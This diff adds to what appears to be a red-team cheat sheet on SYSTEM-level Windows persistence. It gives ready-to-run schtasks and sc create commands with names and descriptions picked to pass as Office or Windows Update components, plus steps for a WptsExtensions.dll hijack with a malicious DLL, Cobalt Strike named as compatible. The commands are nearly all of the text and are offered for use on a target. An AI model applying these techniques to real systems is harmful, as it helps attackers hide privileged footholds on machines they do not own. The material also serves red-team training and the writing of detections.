@@ -1,17 +1,65 @@
 
--- schtasks on boot --
+This section details important and useful SYSTEM level persistence techniques. Since they are “SYSTEM” they will require administrative privileges and most of them execute during system startup.
 
 
+-- Schtasks on Boot --
 
+Upload binary to system folder and create scheduled task pointing at that binary for execution. Can change OfficeUpdater to a different task name that blends into target system
+
+# Add task
+schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH>
+
+# Query task in verbose mode
+schtasks /query /tn OfficeUpdater /fo list /v
+
+# Delete task
+schtasks /delete /tn OfficeUpdater /f
+
+# Run Task Manually
+schtasks /run /tn OfficeUpdater
+
+# Optional: Can call schtasks to import a task as XML
+schtasks /create /tn  OfficeUpdater /xml <FILE_PATH>.xml /f
 
 
 -- Service Creation --
 
+Upload binary to folder and create service pointing at that binary. Can change the service description and display name to blend into the target system
 
+# Add service (Change displayname to a name that blends in with your executable)
+sc create <SERVICE_NAME> binpath= "<FILE_PATH>" start= auto displayname="Windows Update Proxy Service"
 
+# Assign description to service (Change description to a phrase that blends in with your service information)
+sc description <SERVICE_NAME> "This service ensures Windows Update works correctly in proxy environments"
 
+# Query Service config
+sc qc <SERVICE_NAME>
+
+# Query service status
+sc query <SERVICE_NAME>
+
+# Query service description
+sc qdescription <SERVICE_NAME>
+
+# Delete service
+sc delete <SERVICE_NAME>
+
+# OPTIONAL: Can execute sc.exe commands remotely by referencing the remote system after sc.exe
+sc \\<IP_ADDRESS> qc <SERVICE_NAME>
 
 
 -- Windows 10 .DLL Hijack (WPTSextension) --
 
+Upload malicous.dll named WptsExtensions.dll (works with default Cobalt Strike .dll) anywhere in system path, reboot machine, and the schedule service will load the malicious WptsExtensions.dll
 
+# List folders in PATH
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH
+
+Upload malicous.dll named "WptsExtensions.dll" to folder in PATH
+
+Reboot target computer (Schedule service will load WptsExtensions.dll on startup)
+
+Remove uploaded WptsExtensions.dll to remove persistence
+
+
+Note: Many .dll hijacks exist on Windows systems and a simple Google search should list all the vulnerable filenames, services, and even contain examples of how to execute a given .dll hijack technique on a system.
